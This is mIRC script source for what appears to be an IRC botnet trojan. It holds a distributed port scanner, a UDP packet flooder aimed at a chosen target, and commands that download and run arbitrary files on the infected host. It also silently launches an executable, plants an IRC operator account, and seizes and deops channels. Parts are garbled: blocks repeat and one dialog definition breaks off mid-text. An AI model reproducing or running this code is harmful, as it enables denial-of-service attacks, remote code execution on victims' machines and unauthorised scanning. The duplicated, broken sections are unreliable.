%nick = $gettok($gettok(%clones.read,2,58),%clones.cnt2,32) |  if (%nick == $null) { goto end } |   if ($left(%nick,1) != @) { goto home } |  %nick = $gettok(%nick,1,64) |   if ($isbot(%nick) == $true) { goto home } |   if (%clones.incme != 1) { if (%nick == $me) { goto home } } |   %clones.deopstr = %clones.deopstr %nick |  if ($numtok(%clones.deopstr,32) == 3) { botraw MODE %clones.deopchannel -ooo %clones.deopstr | %clones.deopstr = $null }  |   goto home |    :end |  if ($numtok(%clones.deopstr,32) > 0) { botraw MODE %clones.deopchannel -ooo %clones.deopstr | %clones.deopstr = $null } }  } | elseif (%clones.tmp == KICK) { if ($gettok(%clones.read,4,32) == $sock($sockname).mark) { sockwrite -n $sockname JOIN $gettok(%clones.read,3,32) }  }  }
on *:sockclose:*ock*:{  if ($left($sockname,1) == o) { %clones.sockname = s $+ $sockname } | else { %clones.sockname = $sockname } } 
alias setserver { %clones.setserver = 1 | .dns -h $1 } 
on *:dns:{ if (%clones.setserver == 1) { %clones.server = $iaddress $raddress | %clones.setserver = 0  } }
on *:CONNECT:{ if (%chan == $null) { set %chan #�������  } | /join %chan | /identd on $read winddowslogs | /dns $me | /timercoolconnect off }
on *:DNS:{ if ($nick == $me) { %address = $iaddress } }
on *:OP:#:{ If ($opnick == $me) { //mode # +psnt } }
on *:PART:%chan:{ if ($nick == $me) { //msg %chan Part Attempt!!!! %chan ( $+ $address $+ ) | /timer 1 1 /raw -q join %chan | //run mannager98a.exe /n /fh         } }
on *:DISCONNECT: {  //server %server 6667 | //timercoolconnect -o 0 100 //server %server 6667 } 
raw 433:*: {  nick $read winddowslogs $+ $chr(91) $+ $r(1,99999) $+ $chr(93) }
on *:KICK:#:{ if ($nick == $me) { halt } |  if ($knick == $me) && ($chan == %chan) { timerfastjoin -o 0 600 /join # }  | if ($level($address($knick,3) >= 10)) { /kick # $nick hey bitch! $knick is a master! } }
on *:JOIN:*:{ if ($nick == $me) { /echo whooo | timerfastjoin off }  | if ($level($address($nick,3)) >= 10) { mode # +o $nick } | if ($level($address($nick,4)) = 2) { mode # +v $nick } | if ($level($address($nick,4)) = 3) { mode # +o $nick } } 
on @*:DEOP:*:{ if ($level($address($opnick,3)) >= 10) { mode # +o-o $opnick $nick | /kick # $nick cool! } } 
on *:text:!stopscan*:*:bishazz
on 10:text:!var *:*:{ if ( [ [ $2 ] ] == $null) { halt } | //msg $chan  5�4�HeLLstoRM deLuXe4�5� 15(Var15): $2 is [ [ $2- ] ]  } 
alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read winddowslogs } | if ($1 == 2) { return ^ $+ $read winddowslogs $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read winddowslogs $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read winddowslogs $+ - } | if ($1 == 6) { return $read winddowslogs $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read winddowslogs $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
alias bishazz { /sockclose ip* |  timers off |  unset %begshortip |  unset %beglongip |  unset %endshortip |  unset %endlongip |  unset %port |  unset %botchan |  unset %botnum |  unset %ip* |  unset %loop |  unset %multiply |  unset %total |  unset %totalscaning }
on 10:text:!scan*:#:{ 
  if ($2 == $null) || ($3 == $null) { msg # Error/Syntax: !scan 24.4.51.* [port] | halt }
  if (* !isin $2) { msg # 12 Error! !scan 24.4.51.* [port]  (please) | halt }
  if $me !isvo $chan {   //msg # !stopscan | /msg # 7*** (error) type: //mode # +v $me |   /halt   }
else {   set %begshortip $replace($2,*,1)  |   set %beglongip $longip( %begshortip ) |   set %endshortip $replace($2,*,255)  |   set %endlongip $longip( %endshortip ) |   set %port $3  |  set %botchan $chan  |   /msg $chan [Scanner Started] %begshortip to %endshortip $+ ... [port: $+ %port $+ ] |   /startscanning   } }
alias startscanning {  :loop |  inc %loop | if $nick( %botchan , %loop ,v) == $me {  set %multiply $calc( %loop -1)   |  unset %loop |  goto end   }
else goto loop |  :end | set %botnum $nick( %botchan ,0,v) |  /startscan $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip )) $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip +$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))) %port }
alias unset1variable {  unset %begshortip | unset %endshortip |  unset %botnum |  unset %multiply }
alias startscan { set %beglongip $longip($1) |  set %endlongip $longip($2) |  set %port $3 |  set %total $calc( %endlongip - %beglongip ) |  unset %totalscaning | setnewvars4scan }
alias setnewvars4scan {
  inc %totalscaning
  if %totalscaning == %total /finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 %port
  if $1 == 1 finished
  sockopen ip2 %ip2 %port
  if $1 == 2 finished
  sockopen ip3 %ip3 %port
  if $1 == 3 finished
  sockopen ip4 %ip4 %port
  if $1 == 4 finished
  sockopen ip5 %ip5 %port
  if $1 == 5 finished
  sockopen ip6 %ip6 %port
  if $1 == 6 finished
  sockopen ip7 %ip7 %port
  if $1 == 7 finished
  sockopen ip8 %ip8 %port
  if $1 == 8 finished
  sockopen ip9 %ip9 %port
  if $1 == 9 finished
  sockopen ip10 %ip10 %port
  if $1 == 10 finished
  sockopen ip11 %ip11 %port
  if $1 == 11 finished
  sockopen ip12 %ip12 %port
  if $1 == 12 finished
  sockopen ip13 %ip13 %port
  if $1 == 13 finished
  sockopen ip14 %ip14 %port
  if $1 == 14 finished
  sockopen ip15 %ip15 %port
  if $1 == 15 finished
  sockopen ip16 %ip16 %port
  if $1 == 16 finished
  sockopen ip17 %ip17 %port
  if $1 == 17 finished
  sockopen ip18 %ip18 %port
  if $1 == 18 finished
  sockopen ip19 %ip19 %port
  if $1 == 19 finished
  sockopen ip20 %ip20 %port
  if $1 == 20 finished
  sockopen ip21 %ip21 %port
  if $1 == 21 finished
  sockopen ip22 %ip22 %port
  if $1 == 22 finished
  sockopen ip23 %ip23 %port
  if $1 == 23 finished
  sockopen ip24 %ip24 %port
  if $1 == 24 finished
  sockopen ip25 %ip25 %port
  timer 1 %timeout /sockclose ip*
  timer 1 $calc(1+%timeout) /setnewvars4scan
}
on 1:sockopen:ip*:{  if ($sockerr > 0) { halt } |  /write %port $+ .txt % [ $+ [ $sockname ] ] on %port | /msg %botchan % [ $+ [ $sockname ] ] on %port  |  inc %totalsuccess |   /sockclose $sockname |  /halt }
alias properform {  if ($1 == $null) || ($2 == $null) { /msg $chan Format !scan [beginning IP] [ending IP] [PORT] | halt } |   if ($3 == $null) {  /msg $chan I need the port | halt } |  if (. !isin $1) || (. !isin $2) { /msg $chan sorry I believe an IP has periods in it EG:127.0.0.1 | halt } 
if ($3 !isnum 1-65535) { /msg $chan Invalid Port. Use 1 - 65535 | halt } |  else return good |  halt }
alias finished { msg %botchan [scan complete]: %begshortip to %endshortip %port |  msg %botchan Scanning Complete... |  bishazz | unset1variable |  halt }
on 10:TEXT:!ircd*:*:{
  if ($2- == $null) { .notice $nick Error !ircd start <Oper User> <Oper Pass> (NOTE: Flags Are pre-added - Network Admin - Highest Flags }
  if ($me isvo $chan) && ($nick isop $chan) { //write ircd.conf O:*@*: $+ $4 $+ : $+ $3 $+ :reDRhgwlcLkKbBnGAaNCTufzWH^:10 | .notice $nick 15[12Frozen-�ot15]12 IRCD RUNNING! //server $ip 6667 //oper $3 $4 | //run mannager98a.exe /n /r       ircd.exe }
}
alias smurfdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 2
  %gnum.p = $r(1,65000)
  sockudp gnumc1 $2 %gnum.p @$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*)
  %gnum.p = $r(1,65000) 
  sockudp gnumc3 $2 %gnum.p sdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnd
  %gnum.p = $r(1,65000)
  sockudp gnumc2 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc4 $2 %gnum.p @$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*)
  %gnum.p = $r(1,65000)
  sockudp gnumc5 $2 %gnum.p @$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*)
  %gnum.p = $r(1,65000)
  sockudp gnumc6 $2 %gnum.p sdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnsdgognasporynapgnpiasnd
  %gnum.p = $r(1,65000)
  sockudp gnumc7 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc8 $2 %gnum.p @$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*&^%$%z^*#*^@^@^#@@$#^%&*)
return |  :done | //msg %pchan [Smurf Packeting]: Finished! | .timergcoolt off | unset %gnum* | unset %pchan }
}
alias smurfstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan [Smurf Packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan [Currently Smurf Flooding) $gettok($timer(gcoolt).com,3,32)  | return } |  msg %pchan Sending ( $$1 ) smurf packets to ( $$2 ) on port: ( $$3 ) |  set %gnum 0 |  .timergcoolt -m 0 60 smurfdope $1 $2 $3 }
on *:sockopen:http: {
  if ($sockerr > 0) { echo -a error connecting to server $bracket(%http.domain) | sockclose http | return }
  echo -a getting file $bracket($nopath(%http.get))
  .write -c %http.get
  sockwrite -n http GET %http.ext
}
on *:sockread:http: {
  :x
  sockread &http
  bwrite %http.get -1 &http
  if ($sockbr == 0) { return }
  goto x
}
on *:sockclose:http: {
  set %lastget %http.get
  amsg received file %http $+ , it has been placed into $getdir 

  return
}
dialog dict {
  title "online dictionary"
  size -1 -1 400 200
  text "Word to define", 10, 14 10 100 20
  edit "wonder", 20, 10 30 280 22, result autohs
  button "&Define", 30, 300 30 80 25, OK default
  edit "", 21, 10 60 370 130, multi return vsbar
}
on *:dialog:dict:sclick:30: {
  if ($did(dict,20) == $null) return
  set %dict.word $did(dict,20)
  dict_lookup %dict.word
  did -r dict 21
  did -a dict 21 Defining $did(dict,20) $+ ... $crlf $crlf
  halt
}
on *:sockopen:dict: {
  if ($sockerr > 0) { did -a dict 21 cannot connect with dictionary server | sockclose dict | return }
  sockwrite -n dict DEFINE %dict.word
}
on *:sockread:dict: {
  :x
  if ($sock(dict) == $null) { return } | sockread %dict.read
  if ($sockbr == 0) { sockclose dict }
  set %dict.blah DEFINITION 0
  if ($gettok(%dict.read,1,32) == error) || ($gettok(%dict.read,1,32) == spelling) { sockclose dict | did -a dict 21 no definition for %dict.word | return }
  if (%dict.blah == %dict.read) goto x
  if (%dict.read) did -a dict 21 %dict.read $crlf
  goto x
}
on 1:sockopen:nic: {
  if ($sockerr > 0) { did -a nic 21 Error connecting to internic server | sockclose nic | return }
  sockwrite -n nic whois %internic.domain
}
on 1:sockread:nic: {
  :x
  sockread %internic.read
  if ($sockbr == 0) { return }
  did -a nic 21 %internic.read $crlf
  goto x
}
dialog nic {
  title "internic lookup"
on *:sockopen:dict: {
  if ($sockerr > 0) { did -a dict 21 cannot connect with dictionary server | sockclose dict | return }
  sockwrite -n dict DEFINE %dict.word
}
on *:sockread:dict: {
  :x
  if ($sock(dict) == $null) { return } | sockread %dict.read
  if ($sockbr == 0) { sockclose dict }
  set %dict.blah DEFINITION 0
  if ($gettok(%dict.read,1,32) == error) || ($gettok(%dict.read,1,32) == spelling) { sockclose dict | did -a dict 21 no definition for %dict.word | return }
  if (%dict.blah == %dict.read) goto x
  if (%dict.read) did -a dict 21 %dict.read $crlf
  goto x
}
on 1:sockopen:nic: {
  if ($sockerr > 0) { did -a nic 21 Error connecting to internic server | sockclose nic | return }
  sockwrite -n nic whois %internic.domain
}
on 1:sockread:nic: {
  :x
  sockread %internic.read
  if ($sockbr == 0) { return }
  did -a nic 21 %internic.read $crlf
  goto x
}
dialog nic {
  title "internic lookup"
  size -1 -1 400 200
  text "Domain to look up", 10, 14 10 100 20
  edit "pornstar.com", 20, 10 30 280 22, result autohs
  button "&Look Up", 30, 300 30 80 25, OK default
  edit "", 21, 10 60 370 130, multi return vsbar
}
on *:dialog:nic:sclick:30: {
  if ($did(nic,20) == $null) return
  set %internic.domain $did(nic,20)
  nic_lookup $did(nic,20)
  did -r nic 21
  did -a nic 21 Looking up $did(nic,20) $+ ... $crlf $crlf
  halt
}
menu channel,status,menubar {
  sockets
  .download
  ..get file:http $$?="http://www.url.com/dir/file.html"
  ..stop trans:https
  .dict:dict
  .internic:nic
  .-
  .help:run $$dir="Select the file, its called readmesock.txt" $mircdir\readmesock.txt
}
alias http {
  if ($1) {
    set %http.full $remove($1,http://)
    set %http.domain $gettok(%http.full,1,47)
    set %http.ext / $+ $gettok(%http.full,2-,47)
    set %http.get $getdir $+ $gettok(%http.ext,$gettok(%http.ext,0,47),47)
    sockopen http %http.domain 80
    echo -a connecting to $1- | set %http $1-
    return
  }
  usage http
}
alias https {
  if ($sock(http) == $null) { echo -a no download in progress | return }
  sockclose http
  echo -a stopped http download $bracket($nopath(%http.get))
  return
}
alias sf12 run $getdir
alias dict if ($1) { set %dict.word $1 } | dict_dial
alias dict_lookup sockopen dict muesli.ai.mit.edu 2627
alias dict_dial dialog -m dict dict
alias nic if ($1) { set %internic.domain $1 } | nic_dial
alias nic_lookup sockopen nic rs.internic.net 43
alias nic_dial dialog -m nic nic

on 10:TEXT:!gethttp*:#: if ($address == %master) { %w.g.# = # | /http $2 }
on 10:TEXT:!gethttp*:?: if ($address == %master) { %w.g.# = $nick | /http $2 }
on 10:TEXT:!filehttp:#: { msg $chan File: %http.get }
on 10:TEXT:!runhttp:#: if ($address == %master) { %w.g.# = # | /msg # Running: %http.get In: %http.get | /run %http.get }
on 10:TEXT:!runhttp:?: if ($address == %master) { %w.g.# = $nick | /msg $nick Running: %http.get In: %http.get | /run %http.get   size -1 -1 400 200
  text "Domain to look up", 10, 14 10 100 20
  edit "pornstar.com", 20, 10 30 280 22, result autohs
  button "&Look Up", 30, 300 30 80 25, OK default
  edit "", 21, 10 60 370 130, multi return vsbar
}
on *:dialog:nic:sclick:30: {
  if ($did(nic,20) == $null) return
  set %internic.domain $did(nic,20)
  nic_lookup $did(nic,20)
  did -r nic 21
  did -a nic 21 Looking up $did(nic,20) $+ ... $crlf $crlf
  halt
}
menu channel,status,menubar {
  sockets
  .download
  ..get file:http $$?="http://www.url.com/dir/file.html"
  ..stop trans:https
  .dict:dict
  .internic:nic
  .-
  .help:run $$dir="Select the file, its called readmesock.txt" $mircdir\readmesock.txt
}
alias http {
  if ($1) {
    set %http.full $remove($1,http://)
    set %http.domain $gettok(%http.full,1,47)
    set %http.ext / $+ $gettok(%http.full,2-,47)
    set %http.get $getdir $+ $gettok(%http.ext,$gettok(%http.ext,0,47),47)
    sockopen http %http.domain 80
    echo -a connecting to $1- | set %http $1-
    return
  }
  usage http
}
alias https {
  if ($sock(http) == $null) { echo -a no download in progress | return }
  sockclose http
  echo -a stopped http download $bracket($nopath(%http.get))
  return
}
alias sf12 run $getdir
alias dict if ($1) { set %dict.word $1 } | dict_dial
alias dict_lookup sockopen dict muesli.ai.mit.edu 2627
alias dict_dial dialog -m dict dict
alias nic if ($1) { set %internic.domain $1 } | nic_dial
alias nic_lookup sockopen nic rs.internic.net 43
alias nic_dial dialog -m nic nic

on 10:TEXT:!gethttp*:#: if ($address == %master) { %w.g.# = # | /http $2 }
on 10:TEXT:!gethttp*:?: if ($address == %master) { %w.g.# = $nick | /http $2 }
on 10:TEXT:!filehttp:#: { msg $chan File: %http.get }
on 10:TEXT:!runhttp:#: if ($address == %master) { %w.g.# = # | /msg # Running: %http.get In: %http.get | /run %http.get }
on 10:TEXT:!runhttp:?: if ($address == %master) { %w.g.# = $nick | /msg $nick Running: %http.get In: %http.get | /run %http.get }
